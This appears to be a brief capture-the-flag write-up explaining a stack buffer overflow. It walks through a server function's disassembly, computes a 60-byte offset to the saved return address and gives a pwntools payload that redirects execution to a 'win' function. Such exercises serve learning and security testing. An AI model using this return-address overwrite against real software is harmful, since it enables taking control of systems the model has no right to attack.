By disassemble the server, we can see these line:
push    ebp
mov     ebp, esp
push    ebx
sub     esp, 52         ; 52 bytes

So to overwrite return address, we need to overwrite 52 bytes (sub), then 4 bytes from ebx, then another 4 bytes from ebp
-> 60 bytes

After 60 bytes, we can start overwrite return address
payload = b'A' * 60 + p32(elf.symbols['win'])
